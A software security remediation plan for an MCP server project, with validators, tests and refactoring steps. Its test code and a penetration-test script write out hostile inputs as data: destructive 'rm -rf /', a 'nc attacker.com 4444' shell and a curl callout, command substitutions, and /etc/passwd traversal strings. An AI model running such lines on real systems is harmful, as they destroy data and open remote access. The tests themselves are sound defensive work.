# 🔧 CRITICAL REVIEW REMEDIATION PLAN

**Project**: Session-Buddy v0.13.0
**Date**: 2025-02-02
**Review Type**: Multi-Agent Critical Review (8 specialized agents)
**Current Health Grade**: C+ (72/100)

---

## 📊 EXECUTIVE SUMMARY

### Current State
Session-Buddy is a production MCP server with 42 tools, 141 test files, but significant technical debt:

- **3 CRITICAL security vulnerabilities** requiring immediate attention
- **17 code quality issues** including deprecated code still active
- **5 critical performance bottlenecks** blocking event loop
- **Architecture Grade C** (74/100) with layer violations
- **Test coverage 6.5/10** with zero MCP tool tests
- **Dependency footprint 814MB** with unused heavy packages

### Remediation Strategy
**6-phase approach over 8-10 weeks** prioritizing security while maintaining production stability.

### Success Criteria
- ✅ Zero CRITICAL/HIGH security vulnerabilities
- ✅ Architecture grade B+ (85/100)
- ✅ Test coverage 8.5+/10
- ✅ 50% reduction in dependency footprint
- ✅ Zero production incidents during rollout

---

## 🚨 PHASE 0: SECURITY STABILIZATION (3 DAYS - IMMEDIATE)

**Objective**: Deploy emergency mitigations for CRITICAL vulnerabilities before full fixes.

### 0.1 Path Traversal Emergency Fix (Day 1 - 4 hours)

**Issue**: `os.chdir(working_directory)` in session_manager.py:418 accepts unvalidated user input

**Emergency Mitigation**:
```python
# Add to session_buddy/core/session_manager.py
def _validate_working_directory(path: str) -> Path:
    """Validate working directory path to prevent traversal attacks."""
    resolved = Path(path).resolve()
    # Ensure path doesn't escape allowed directories
    allowed_roots = {Path.cwd(), Path.home()}
    if not any(str(resolved).startswith(str(root)) for root in allowed_roots):
        raise ValueError(f"Path outside allowed roots: {path}")
    return resolved

# In _setup_working_directory (line 418):
if working_directory:
    validated_path = _validate_working_directory(working_directory)
    os.chdir(validated_path)  # Now safe
```

**Verification**:
```python
# Add to tests/security/test_path_validation.py
def test_path_traversal_prevention():
    """Test path traversal attacks are blocked."""
    manager = SessionLifecycleManager()

    # Should block traversal attempts
    with pytest.raises(ValueError, match="outside allowed roots"):
        manager._validate_working_directory("../../../etc/passwd")

    with pytest.raises(ValueError, match="outside allowed roots"):
        manager._validate_working_directory("~/../../etc")
```

**Files to Modify**:
- `session_buddy/core/session_manager.py` (line 418)
- `tests/security/test_path_validation.py` (new)

---

### 0.2 Command Injection Temporary Block (Day 1 - 3 hours)

**Issue**: `args.split()` in crackerjack_tools.py allows shell injection

**Emergency Mitigation**:
```python
# Add to session_buddy/mcp/tools/session/crackerjack_tools.py
def _sanitize_crackerjack_args_emergency(args: str) -> list[str]:
    """Temporary strict argument validation - will be replaced in Phase 1."""
    if not args:
        return []

    # Emergency: Block all but safest arguments
    ALLOWED_ARGS = {"--verbose", "--quiet", "--no-color", "-v", "-q"}
    tokens = args.split()

    for token in tokens:
        if token not in ALLOWED_ARGS:
            raise ValueError(
                f"Blocked potentially unsafe argument: {token}. "
                f"Currently allowed: {', '.join(sorted(ALLOWED_ARGS))}"
            )
    return tokens

# In execute_crackerjack_command, replace args.split() with:
args_list = _sanitize_crackerjack_args_emergency(args)
```

**Verification**:
```python
# Add to tests/security/test_command_injection.py
def test_command_injection_blocked():
    """Test command injection attempts are blocked."""

    # Should block shell metacharacters
    with pytest.raises(ValueError, match="unsafe argument"):
        _sanitize_crackerjack_args_emergency("; rm -rf /")

    with pytest.raises(ValueError, match="unsafe argument"):
        _sanitize_crackerjack_args_emergency("&& curl attacker.com")

    # Should allow safe arguments
    result = _sanitize_crackerjack_args_emergency("--verbose --quiet")
    assert result == ["--verbose", "--quiet"]
```

**Files to Modify**:
- `session_buddy/mcp/tools/session/crackerjack_tools.py` (lines with args.split)
- `tests/security/test_command_injection.py` (new)

---

### 0.3 Git Subprocess Validation Enhancement (Day 2 - 3 hours)

**Issue**: Regex validation for prune delay insufficient in git_operations.py:652

**Emergency Mitigation**:
```python
# In session_buddy/utils/git_operations.py, enhance _validate_prune_delay
def _validate_prune_delay(prune_delay: str) -> tuple[bool, str]:
    """Enhanced validation with numeric range checks."""
    import re

    # Existing patterns
    safe_patterns = [
        r"^(now|never)$",
        r"^(\d{1,3})\.(seconds?|minutes?|hours?|days?|weeks?|months?|years?)$",
    ]

    # Match pattern
    for pattern in safe_patterns:
        if match := re.match(pattern, prune_delay, re.IGNORECASE):
            # Additional validation: check numeric ranges
            if match.group(1):  # Has number
                value = int(match.group(1))
                if value > 1000:  # Reasonable upper bound
                    return False, f"Value too large: {value}"
            return True, ""

    return False, f"Invalid prune delay format: {prune_delay}"
```

**Verification**:
```python
# Add to tests/security/test_git_subprocess.py
def test_prune_delay_validation():
    """Test prune delay validation blocks malicious inputs."""

    # Should allow valid values
    valid, _ = _validate_prune_delay("2.weeks")
    assert valid is True

    valid, _ = _validate_prune_delay("now")
    assert valid is True

    # Should block excessive values
    valid, msg = _validate_prune_delay("10000.weeks")
    assert valid is False
    assert "too large" in msg

    # Should block invalid format
    valid, _ = _validate_prune_delay("$(reboot)")
    assert valid is False
```

**Files to Modify**:
- `session_buddy/utils/git_operations.py` (line 541-571, enhance validation)
- `tests/security/test_git_subprocess.py` (new)

---

### 0.4 Environment Variable Exposure Fix (Day 2-3 - 6 hours)

**Issue**: Environment variables exposed in chdir and subprocess operations

**Mitigation**:
```python
# Add to session_buddy/utils/subprocess_helper.py (new file)
import os
import copy
from typing import Any

def _get_safe_environment() -> dict[str, str]:
    """Return sanitized environment without sensitive vars."""
    SENSITIVE_PATTERNS = {"PASSWORD", "TOKEN", "SECRET", "KEY", "CREDENTIAL", "API"}
    env = copy.deepcopy(os.environ)

    for key in list(env.keys()):
        if any(pattern in key.upper() for pattern in SENSITIVE_PATTERNS):
            del env[key]

    return env

# Use in all subprocess calls:
# In git_operations.py:
subprocess.Popen(
    ["git", "gc", "--auto", f"--prune={safe_delay}"],
    env=_get_safe_environment(),  # Sanitized
    cwd=directory,
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)
```

**Verification**:
```python
# Add to tests/security/test_env_sanitization.py
import os

def test_environment_sanitization():
    """Test sensitive environment variables are removed."""
    # Set sensitive variables
    os.environ["TEST_PASSWORD"] = "secret123"
    os.environ["TEST_TOKEN"] = "abc123"
    os.environ["TEST_NORMAL"] = "normal_value"

    safe_env = _get_safe_environment()

    # Sensitive vars should be removed
    assert "TEST_PASSWORD" not in safe_env
    assert "TEST_TOKEN" not in safe_env

    # Normal vars should remain
    assert safe_env.get("TEST_NORMAL") == "normal_value"
```

**Files to Create**:
- `session_buddy/utils/subprocess_helper.py` (new)
- `tests/security/test_env_sanitization.py` (new)

---

### 0.5 Security Testing Suite (Day 3 - 8 hours)

**Create comprehensive security test suite**:

```bash
# Create directory structure
mkdir -p tests/security

# Create test files
touch tests/security/__init__.py
touch tests/security/test_path_validation.py
touch tests/security/test_command_injection.py
touch tests/security/test_git_subprocess.py
touch tests/security/test_env_sanitization.py
touch tests/security/test_subprocess_safety.py
```

**Run security audit**:
```bash
# Run new security tests
pytest tests/security/ -v

# Run static analysis
bandit -r session_buddy/ -f json -o security-report.json

# Check dependencies
pip-audit --desc --format json --output vulnerability-report.json
```

**Phase 0 Deliverables**:
- ✅ Emergency mitigations deployed
- ✅ Security test suite created (20+ tests)
- ✅ Zero CRITICAL vulnerabilities in production
- ✅ Security report generated

**Timeline**: 24 hours total

---

## 🔒 PHASE 1: CRITICAL SECURITY FIXES (1 WEEK)

**Objective**: Implement permanent fixes for all security vulnerabilities.

### 1.1 Path Validation Framework (Days 1-2 - 16 hours)

**Create reusable path validation utilities**:

```python
# session_buddy/utils/path_validation.py (NEW FILE)
from pathlib import Path
from typing import Literal

class PathValidator:
    """Centralized path validation for security."""

    ALLOWED_SCHEMES = {"file", ""}
    MAX_PATH_LENGTH = 4096  # POSIX limit

    @staticmethod
    def validate_user_path(
        path: str | Path,
        allow_traversal: bool = False,
        base_dir: Path | None = None,
    ) -> Path:
        """Validate user-provided path with security checks."""
        # Type conversion
        if isinstance(path, str):
            # Check for null bytes (Windows bypass)
            if "\x00" in path:
                raise ValueError("Null bytes not allowed in path")
            path = Path(path)

        # Length check
        path_str = str(path)
        if len(path_str) > PathValidator.MAX_PATH_LENGTH:
            raise ValueError(f"Path too long: {len(path_str)}")

        # Resolve to absolute (also resolves symlinks)
        resolved = path.resolve()

        # Traversal prevention
        if not allow_traversal and base_dir:
            try:
                resolved.relative_to(base_dir.resolve())
            except ValueError:
                raise ValueError(
                    f"Path {resolved} escapes base directory {base_dir}"
                )

        # Check existence if required
        if not resolved.exists():
            raise ValueError(f"Path does not exist: {resolved}")

        # Check if directory (not file)
        if not resolved.is_dir():
            raise ValueError(f"Path is not a directory: {resolved}")

        return resolved

    @staticmethod
    def validate_git_path(path: str | Path) -> Path:
        """Validate paths for git operations."""
        validated = PathValidator.validate_user_path(path)

        # Additional git-specific checks
        path_parts = str(validated).split("/")
        if ".git" in path_parts[:-1]:  # Allow .git at end only
            raise ValueError(f"Direct .git access blocked: {path}")

        return validated
```

**Integration Points**:
- `session_manager.py:_setup_working_directory()`
- `worktree_manager.py:all_path_operations`
- MCP tools with file path parameters

**Tests**:
```python
# tests/unit/test_path_validation.py
import pytest
from pathlib import Path
from session_buddy.utils.path_validation import PathValidator

def test_validate_user_path_normal():
    """Test normal path validation."""
    valid_path = PathValidator.validate_user_path(Path.cwd())
    assert valid_path == Path.cwd()

def test_validate_user_path_traversal_blocked():
    """Test path traversal is blocked."""
    with pytest.raises(ValueError, match="escapes base directory"):
        PathValidator.validate_user_path(
            "../../../etc/passwd",
            base_dir=Path.cwd()
        )

def test_validate_user_path_too_long():
    """Test path length limit."""
    long_path = "a" * 5000
    with pytest.raises(ValueError, match="too long"):
        PathValidator.validate_user_path(long_path)

def test_validate_git_path_dot_git_blocked():
    """Test direct .git access is blocked."""
    with pytest.raises(ValueError, match="Direct .git access blocked"):
        PathValidator.validate_git_path(Path.cwd() / ".git" / "config")
```

**Files to Create/Modify**:
- `session_buddy/utils/path_validation.py` (NEW - 150 lines)
- `session_buddy/core/session_manager.py` (use PathValidator)
- `session_buddy/worktree_manager.py` (use PathValidator)
- `tests/unit/test_path_validation.py` (NEW - 80 lines)

---

### 1.2 Subprocess Safety Layer (Days 2-4 - 24 hours)

**Create centralized subprocess wrapper**:

```python
# session_buddy/utils/subprocess_helper.py (EXPAND FILE)
from __future__ import annotations

import subprocess
import shlex
from typing import Any

class SafeSubprocess:
    """Secure subprocess execution with validation."""

    @staticmethod
    def validate_command(
        command: list[str],
        allowed_commands: set[str],
    ) -> list[str]:
        """Validate command against allowlist."""
        if not command:
            raise ValueError("Empty command")

        base_cmd = command[0]
        if base_cmd not in allowed_commands:
            raise ValueError(
                f"Command not allowed: {base_cmd}. "
                f"Allowed: {allowed_commands}"
            )

        # Validate no shell metacharacters in arguments
        dangerous_chars = {';', '|', '&', '$', '`', '(', ')', '<', '>', '\n', '\r'}
        for arg in command[1:]:
            arg_str = str(arg)
            if any(char in arg_str for char in dangerous_chars):
                raise ValueError(
                    f"Shell metacharacter in argument: {arg}"
                )

        return command

    @staticmethod
    def run_safe(
        command: list[str],
        allowed_commands: set[str],
        **kwargs: Any,
    ) -> subprocess.CompletedProcess[str]:
        """Run subprocess with validation."""
        validated = SafeSubprocess.validate_command(
            command, allowed_commands
        )

        # Enforce safety defaults
        kwargs.setdefault("shell", False)
        kwargs.setdefault("capture_output", True)
        kwargs.setdefault("text", True)
        kwargs.setdefault("check", False)

        return subprocess.run(validated, **kwargs)

    @staticmethod
    def popen_safe(
        command: list[str],
        allowed_commands: set[str],
        **kwargs: Any,
    ) -> subprocess.Popen[str]:
        """Popen with validation."""
        validated = SafeSubprocess.validate_command(
            command, allowed_commands
        )

        kwargs.setdefault("shell", False)
        kwargs.setdefault("stdout", subprocess.DEVNULL)
        kwargs.setdefault("stderr", subprocess.DEVNULL)

        return subprocess.Popen(validated, **kwargs)
```

**Allowed Commands Configuration**:
```python
# session_buddy/settings.py (ADD)
# Allowed commands for subprocess execution
ALLOWED_GIT_COMMANDS = {
    "git", "git-status", "git-commit", "git-add",
    "git-gc", "git-config", "git-rev-parse", "git-worktree",
}

ALLOWED_CRACKERJACK_COMMANDS = {
    "python", "python3", "python3.13", "uv", "crackerjack",
}

ALLOWED_SYSTEM_COMMANDS = {
    "mkdir", "chmod", "chown", "ls", "find",
}
```

**Integration**:
```python
# In git_operations.py, replace subprocess calls:
from session_buddy.utils.subprocess_helper import SafeSubprocess
from session_buddy.settings import ALLOWED_GIT_COMMANDS

# Old:
# subprocess.Popen(["git", "gc", "--auto"], ...)

# New:
SafeSubprocess.popen_safe(
    ["git", "gc", "--auto"],
    allowed_commands=ALLOWED_GIT_COMMANDS,
    cwd=directory,
)
```

**Tests**:
```python
# tests/unit/test_subprocess_helper.py
import pytest
from session_buddy.utils.subprocess_helper import SafeSubprocess

def test_validate_command_allowed():
    """Test allowed command validation."""
    cmd = ["git", "status"]
    validated = SafeSubprocess.validate_command(cmd, {"git", "python"})
    assert validated == cmd

def test_validate_command_blocked():
    """Test blocked command raises error."""
    with pytest.raises(ValueError, match="Command not allowed"):
        SafeSubprocess.validate_command(["rm", "-rf", "/"], {"git"})

def test_validate_command_shell_injection():
    """Test shell metacharacters are blocked."""
    with pytest.raises(ValueError, match="Shell metacharacter"):
        SafeSubprocess.validate_command(
            ["git", "commit; rm -rf /"],
            {"git"}
        )

def test_run_safe_normal():
    """Test normal command execution."""
    result = SafeSubprocess.run_safe(
        ["echo", "test"],
        allowed_commands={"echo"}
    )
    assert result.stdout.strip() == "test"
```

**Files to Create/Modify**:
- `session_buddy/utils/subprocess_helper.py` (EXPAND to 200 lines)
- `session_buddy/settings.py` (add allowed commands)
- `session_buddy/utils/git_operations.py` (use SafeSubprocess)
- `session_buddy/mcp/tools/session/crackerjack_tools.py` (use SafeSubprocess)
- `tests/unit/test_subprocess_helper.py` (NEW - 100 lines)

---

### 1.3 Crackerjack Argument Sanitization (Days 4-5 - 16 hours)

**Implement proper argument parsing with shlex**:

```python
# session_buddy/mcp/tools/session/crackerjack_tools.py (ADD FUNCTION)
import shlex
from typing import Literal

CrackerjackCommand = Literal[
    "test", "lint", "check", "format",
    "security", "complexity", "all"
]

def _parse_crackerjack_args(args: str) -> tuple[list[str], list[str]]:
    """Parse and validate crackerjack arguments.

    Returns:
        (positional_args, flags)

    Raises:
        ValueError: If args contain unsafe patterns
    """
    if not args:
        return [], []

    # Use shlex for safe parsing (respects quotes)
    try:
        tokens = shlex.split(args)
    except ValueError as e:
        raise ValueError(f"Invalid argument syntax: {e}")

    commands: list[str] = []
    flags: list[str] = []

    # Define allowed flags
    ALLOWED_FLAGS = {
        "--verbose", "-v",
        "--quiet", "-q",
        "--no-color",
        "--strict",
        "--fix",
        "--ai-agent",
        "--timeout",
    }

    for token in tokens:
        # Check for dangerous patterns
        dangerous_chars = {';', '|', '&', '$', '`', '(', ')'}
        if any(char in token for char in dangerous_chars):
            raise ValueError(
                f"Dangerous character '{char}' in argument: {token}"
            )

        # Check for flag injection (--flag=malicious)
        if '=' in token and not token.startswith('--'):
            raise ValueError(f"Invalid argument format: {token}")

        # Separate flags from positional args
        if token.startswith("-"):
            if token not in ALLOWED_FLAGS:
                raise ValueError(
                    f"Flag not allowed: {token}. "
                    f"Allowed: {', '.join(sorted(ALLOWED_FLAGS))}"
                )
            flags.append(token)
        else:
            commands.append(token)

    return commands, flags

# UPDATE execute_crackerjack_command function
@mcp.tool()
async def execute_crackerjack_command(
    command: str,
    args: str = "",
    working_directory: str = ".",
    timeout: int = 300,
    ai_agent_mode: bool = True,
) -> str:
    """Execute Crackerjack command safely."""

    # Parse and validate args
    try:
        command_args, flags = _parse_crackerjack_args(args)
    except ValueError as e:
        return f"❌ Invalid arguments: {e}"

    # Build command list
    cmd = ["python", "-m", "crackerjack", command]
    cmd.extend(command_args)
    if ai_agent_mode:
        cmd.append("--ai-agent")
    cmd.extend(flags)

    # Execute with SafeSubprocess
    from session_buddy.utils.subprocess_helper import SafeSubprocess
    from session_buddy.settings import ALLOWED_CRACKERJACK_COMMANDS

    try:
        result = SafeSubprocess.run_safe(
            cmd,
            allowed_commands=ALLOWED_CRACKERJACK_COMMANDS,
            cwd=working_directory,
            timeout=timeout,
            capture_output=True,
        )

        output = result.stdout
        if result.stderr:
            output += f"\nErrors:\n{result.stderr}"

        return output

    except subprocess.TimeoutExpired:
        return f"❌ Command timed out after {timeout} seconds"
    except Exception as e:
        return f"❌ Command failed: {e}"
```

**Tests**:
```python
# tests/unit/test_crackerjack_args.py
import pytest
from session_buddy.mcp.tools.session.crackerjack_tools import _parse_crackerjack_args

def test_parse_crackerjack_args_normal():
    """Test normal argument parsing."""
    commands, flags = _parse_crackerjack_args("--verbose --quiet")
    assert sorted(flags) == sorted(["--verbose", "--quiet"])
    assert commands == []

def test_parse_crackerjack_args_with_commands():
    """Test parsing with positional arguments."""
    commands, flags = _parse_crackerjack_args("file1.py file2.py --verbose")
    assert commands == ["file1.py", "file2.py"]
    assert flags == ["--verbose"]

def test_parse_crackerjack_args_injection_blocked():
    """Test shell injection is blocked."""
    with pytest.raises(ValueError, match="Dangerous character"):
        _parse_crackerjack_args("; rm -rf /")

    with pytest.raises(ValueError, match="Dangerous character"):
        _parse_crackerjack_args("&& curl attacker.com")

def test_parse_crackerjack_args_quotes_preserved():
    """Test quotes are preserved correctly."""
    commands, flags = _parse_crackerjack_args('--message "Test message with spaces"')
    assert commands == ["--message", "Test message with spaces"]

def test_parse_crackerjack_args_invalid_flag():
    """Test invalid flags are blocked."""
    with pytest.raises(ValueError, match="Flag not allowed"):
        _parse_crackerjack_args("--malicious-flag")
```

**Files to Modify**:
- `session_buddy/mcp/tools/session/crackerjack_tools.py` (add parsing, update execute function)
- `tests/unit/test_crackerjack_args.py` (NEW - 80 lines)

---

### 1.4 Security Hardening Validation (Days 6-7 - 16 hours)

**Comprehensive security testing**:

```bash
# Run all security tests
pytest tests/security/ -v --cov=session_buddy.utils.subprocess_helper --cov=session_buddy.utils.path_validation

# Static analysis
bandit -r session_buddy/ -f json -o security-report-phase1.json

# Dependency vulnerability check
pip-audit --desc --format json --output vulnerability-report.json

# Manual penetration testing script
# tests/security/manual_penetration_tests.py
import asyncio
from session_buddy.core.session_manager import SessionLifecycleManager
from session_buddy.mcp.tools.session.crackerjack_tools import _parse_crackerjack_args, execute_crackerjack_command

async def test_path_traversal_attempts():
    """Test various path traversal attacks."""
    manager = SessionLifecycleManager()

    traversal_attempts = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
    ]

    for attempt in traversal_attempts:
        print(f"Testing: {attempt}")
        try:
            result = manager._validate_working_directory(attempt)
            print(f"  ❌ FAILED: Blocked path was accepted: {result}")
        except ValueError as e:
            print(f"  ✅ PASSED: {e}")

async def test_command_injection_attempts():
    """Test various command injection attacks."""
    injection_attempts = [
        "; rm -rf /",
        "&& curl attacker.com",
        "| nc attacker.com 4444",
        "`reboot`",
        "$(whoami)",
        "$(sleep 5)",
    ]

    for attempt in injection_attempts:
        print(f"Testing: {attempt}")
        try:
            result = _parse_crackerjack_args(attempt)
            print(f"  ❌ FAILED: Injection was accepted: {result}")
        except ValueError as e:
            print(f"  ✅ PASSED: {e}")

if __name__ == "__main__":
    asyncio.run(test_path_traversal_attempts())
    print()
    asyncio.run(test_command_injection_attempts())
```

**Create security documentation**:

```markdown
# docs/security/SECURITY_HARDENING.md (NEW)
# Security Hardening Documentation

## Overview
Session-Buddy implements defense-in-depth security measures to protect against common vulnerabilities.

## Path Validation
All user-provided paths are validated using `PathValidator.validate_user_path()`:
- Null byte prevention
- Length limits (4096 chars)
- Traversal prevention
- Symlink resolution
- Existence checking

## Subprocess Safety
All subprocess calls use `SafeSubprocess` wrapper:
- Command allowlisting
- Shell metacharacter blocking
- Environment sanitization
- No shell=True usage

## Input Validation
All MCP tool parameters use Pydantic validation:
- Type checking
- Length limits
- Format validation
- Custom validators

## Testing
Security tests are in `tests/security/`:
- Path validation tests
- Command injection tests
- Subprocess safety tests
- Environment sanitization tests

## Reporting Security Issues
Found a security issue? Please report privately:
- Email: security@sessionbuddy.dev
- PGP key: [KEY]
```

**Phase 1 Deliverables**:
- ✅ Zero CRITICAL security vulnerabilities
- ✅ Path validation framework (150 lines)
- ✅ Safe subprocess layer (200 lines)
- ✅ Security test suite (100+ tests, 90%+ coverage)
- ✅ Security documentation

---

## 🏗️ PHASE 2: ARCHITECTURE REFACTORING (2 WEEKS)

**Objective**: Improve architecture from Grade C (74/100) to Grade B+ (85/100).

### 2.1 Deprecated Code Removal (Days 1-3 - 24 hours)

**Remove deprecated ReflectionDatabase class**:

**Current State**:
- reflection_tools.py: 1,346 lines total
- Deprecated ReflectionDatabase class: 1,200+ lines
- Still imported in 15+ places

**Step 1: Identify all usages**
```bash
cd /Users/les/Projects/session-buddy
grep -r "from session_buddy.reflection_tools import ReflectionDatabase" session_buddy/
grep -r "from session_buddy.reflection_tools import" session_buddy/
grep -r "ReflectionDatabase" session_buddy/ --include="*.py" | grep -v test
```

**Step 2: Update all imports**

Files to update:
- `session_buddy/advanced_features.py`
- `session_buddy/memory/conscious_agent.py`
- `session_buddy/mcp/tools/memory/reflection_tools.py` (if exists)
- All files importing from reflection_tools

```python
# OLD (deprecated):
from session_buddy.reflection_tools import ReflectionDatabase, get_reflection_database

# NEW (adapter):
from session_buddy.adapters.reflection_adapter_oneiric import ReflectionDatabase
from session_buddy.adapters.reflection_adapter_oneiric import get_reflection_database
```

**Step 3: Move migration helpers to migrations directory**
```bash
mkdir -p session_buddy/migrations
mv session_buddy/reflection_tools.py session_buddy/migrations/deprecated_reflection_tools.py.bak
```

**Step 4: Create new streamlined reflection_tools.py**
```python
# session_buddy/reflection_tools.py (RECREATE - 150 lines)
"""Reflection tools for session memory.

This module provides utility functions for reflection storage and retrieval.
The main database implementation has moved to adapters/reflection_adapter_oneiric.py
"""

from session_buddy.adapters.reflection_adapter_oneiric import (
    ReflectionDatabase,
    get_reflection_database,
)

__all__ = [
    "ReflectionDatabase",
    "get_reflection_database",
]
```

**Step 5: Update tests**
```bash
# Find all tests using deprecated import
grep -r "from session_buddy.reflection_tools import" tests/

# Update to use adapter
sed -i '' 's/from session_buddy.reflection_tools import/from session_buddy.adapters.reflection_adapter_oneiric import/g' tests/**/*.py
```

**Tests**:
```python
# tests/unit/test_adapter_usage.py
def test_adapter_used_not_deprecated():
    """Verify adapter is used, not deprecated class."""
    from session_buddy.reflection_tools import ReflectionDatabase

    # Should be the adapter, not deprecated class
    from session_buddy.adapters.reflection_adapter_oneiric import ReflectionDatabase as Adapter
    assert ReflectionDatabase is Adapter
```

**Timeline**: 24 hours

**Files to Modify**:
- `session_buddy/reflection_tools.py` (RECREATE as 150-line wrapper)
- `session_buddy/migrations/deprecated_reflection_tools.py.bak` (backup)
- All files importing deprecated class (15+ files)
- Tests importing deprecated class (10+ files)

---

### 2.2 Layer Separation Fixes (Days 3-5 - 16 hours)

**Fix core → MCP layer coupling**:

**Problem**: session_manager.py imports server module, creating circular dependency

**Solution**: Invert dependency with interface/protocol

```python
# session_buddy/core/quality_scoring.py (NEW FILE - 80 lines)
"""Quality scoring interface to break circular dependency."""

from abc import ABC, abstractmethod
from pathlib import Path
from typing import Any

class QualityScorer(ABC):
    """Abstract interface for quality scoring.

    This allows the core layer to depend on an interface rather than
    the concrete MCP server implementation.
    """

    @abstractmethod
    async def calculate_quality_score(
        self,
        project_dir: Path | None = None,
    ) -> dict[str, Any]:
        """Calculate project quality score.

        Args:
            project_dir: Project directory to analyze. Defaults to cwd.

        Returns:
            Dictionary with quality metrics:
            - total_score: Overall score (0-100)
            - breakdown: Detailed scores by category
            - recommendations: List of improvement suggestions
        """
        pass

    @abstractmethod
    def get_quality_history(self, project: str) -> list[int]:
        """Get quality score history for a project."""
        pass
```

```python
# session_buddy/server.py (ADD IMPLEMENTATION)
from session_buddy.core.quality_scoring import QualityScorer

class ServerQualityScorer(QualityScorer):
    """Server-side quality scoring implementation."""

    async def calculate_quality_score(
        self,
        project_dir: Path | None = None,
    ) -> dict[str, Any]:
        """Calculate quality score using server utilities."""
        # Existing implementation moved from session_manager
        from session_buddy.utils.quality_utils_v2 import calculate_quality_metrics

        project = project_dir or Path.cwd()
        return await calculate_quality_metrics(project)

    def get_quality_history(self, project: str) -> list[int]:
        """Get quality score history."""
        # Implementation from session_manager
        return self._quality_history.get(project, [])

# Register in DI container
from session_buddy.di import configure
container = configure()
container.register(QualityScorer, ServerQualityScorer)
```

```python
# session_buddy/core/session_manager.py (UPDATE)
from session_buddy.core.quality_scoring import QualityScorer
from session_buddy.di import get_sync_typed

class SessionLifecycleManager:
    """Manages session lifecycle without depending on server module."""

    def __init__(self, logger: logging.Logger | None = None) -> None:
        self.logger = logger or logging.getLogger(__name__)
        self.current_project: str | None = None

        # Inject via DI, no import of server module
        self.quality_scorer = get_sync_typed(QualityScorer)

        self._quality_history: dict[str, list[int]] = {}
        self.session_context: dict[str, t.Any] = {}

    async def calculate_quality_score(
        self,
        project_dir: Path | None = None,
    ) -> dict[str, Any]:
        """Calculate quality score using injected scorer."""
        return await self.quality_scorer.calculate_quality_score(project_dir)
```

```python
# session_buddy/di/__init__.py (UPDATE REGISTRATION)
def configure(force: bool = False) -> Container:
    """Configure dependency injection container."""
    if _container and not force:
        return _container

    container = Container()

    # ... existing registrations ...

    # Register quality scorer
    from session_buddy.core.quality_scoring import QualityScorer
    from session_buddy.server import ServerQualityScorer
    container.register(QualityScorer, ServerQualityScorer, lifetime="singleton")

    _container = container
    return container
```

**Tests**:
```python
# tests/unit/test_layer_separation.py
def test_session_manager_no_server_import():
    """Verify session_manager doesn't import server module."""
    import session_buddy.core.session_manager as sm_module

    # Check imports
    import sys
    assert "session_buddy.server" not in sys.modules or \
           "session_buddy.server" not in str(sm_module.__dict__)

def test_quality_scorer_interface():
    """Test quality scorer can be mocked."""
    from session_buddy.core.quality_scoring import QualityScorer
    from unittest.mock import Mock

    mock_scorer = Mock(spec=QualityScorer)
    mock_scorer.calculate_quality_score.return_value = {"total_score": 85}

    # Should work with mock
    result = await mock_scorer.calculate_quality_score()
    assert result["total_score"] == 85
```

**Timeline**: 16 hours

**Files to Create/Modify**:
- `session_buddy/core/quality_scoring.py` (NEW - 80 lines)
- `session_buddy/server.py` (add ServerQualityScorer class)
- `session_buddy/core/session_manager.py` (remove server import, use DI)
- `session_buddy/di/__init__.py` (register QualityScorer)
- `tests/unit/test_layer_separation.py` (NEW - 60 lines)

---

### 2.3 Hooks System Simplification (Days 5-7 - 24 hours)

**Reduce hooks system complexity by 90%**:

**Current State**:
- 629 lines in hooks.py
- Only 2-3 actual hooks in use
- Causal chain tracking: 0 requirements, 0 usage

**Step 1: Audit active hooks**
```bash
grep -r "HookType\." session_buddy/ --include="*.py" | grep -v test
grep -r "@.*\.register_hook" session_buddy/ --include="*.py" | grep -v test
```

**Step 2: Create simplified event emitter**

```python
# session_buddy/core/events.py (NEW FILE - 100 lines)
"""Simplified event system for session lifecycle.

This replaces the complex hooks system with a simple event emitter.
Reduces code from 629 lines to ~100 lines.
"""

from typing import Any, Callable
from collections import defaultdict
import logging
import asyncio

logger = logging.getLogger(__name__)


class EventEmitter:
    """Simple event emitter for session lifecycle events.

    This is a dramatic simplification from the previous hooks system:
    - No complex priority system
    - No causal chain tracking
    - No HookContext/Wrapper classes
    - Just simple event emission
    """

    def __init__(self) -> None:
        self._listeners: dict[str, list[Callable]] = defaultdict(list)

    def on(self, event: str, callback: Callable) -> None:
        """Register event listener.

        Args:
            event: Event name to listen for
            callback: Async or sync function to call when event emits
        """
        if not callable(callback):
            raise TypeError(f"Callback must be callable, got {type(callback)}")

        self._listeners[event].append(callback)
        logger.debug(f"Registered listener for event: {event}")

    async def emit(self, event: str, **data: Any) -> None:
        """Emit event to all listeners.

        Args:
            event: Event name to emit
            **data: Data to pass to listeners
        """
        if event not in self._listeners:
            return

        logger.debug(f"Emitting event: {event} with data: {list(data.keys())}")

        for callback in self._listeners[event]:
            try:
                result = callback(**data)
                if asyncio.iscoroutine(result):
                    await result
            except Exception as e:
                logger.error(
                    f"Event listener failed for {event}: {e}",
                    exc_info=True
                )

    def remove_listener(self, event: str, callback: Callable) -> None:
        """Remove specific listener."""
        if callback in self._listeners[event]:
            self._listeners[event].remove(callback)

    def clear_listeners(self, event: str | None = None) -> None:
        """Clear all listeners or listeners for specific event."""
        if event:
            self._listeners[event].clear()
        else:
            self._listeners.clear()


# Global event emitter
session_events = EventEmitter()


# Event constants (replaces HookType enum)
class SessionEvent:
    """Session lifecycle event names."""
    PRE_CHECKPOINT = "pre_checkpoint"
    POST_CHECKPOINT = "post_checkpoint"
    SESSION_START = "session_start"
    SESSION_END = "session_end"
    ERROR = "error"
    QUALITY_CHANGE = "quality_change"


# Convenience decorators
def on_checkpoint(callback: Callable) -> Callable:
    """Decorator for checkpoint event listeners."""
    session_events.on(SessionEvent.POST_CHECKPOINT, callback)
    return callback


def on_session_end(callback: Callable) -> Callable:
    """Decorator for session end listeners."""
    session_events.on(SessionEvent.SESSION_END, callback)
    return callback


def on_error(callback: Callable) -> Callable:
    """Decorator for error event listeners."""
    session_events.on(SessionEvent.ERROR, callback)
    return callback
```

**Step 3: Migrate existing hooks**

```python
# OLD (629 lines):
# from session_buddy.core.hooks import HooksManager, HookType, HookContext
#
# hooks_manager = HooksManager()
#
# @hooks_manager.register_hook(HookType.POST_CHECKPOINT, priority=10)
# async def my_hook(context: HookContext) -> HookResult:
#     content = context.metadata.get("content", "")
#     # ... process ...
#     return HookResult(success=True)

# NEW (simple):
# from session_buddy.core.events import session_events, SessionEvent
#
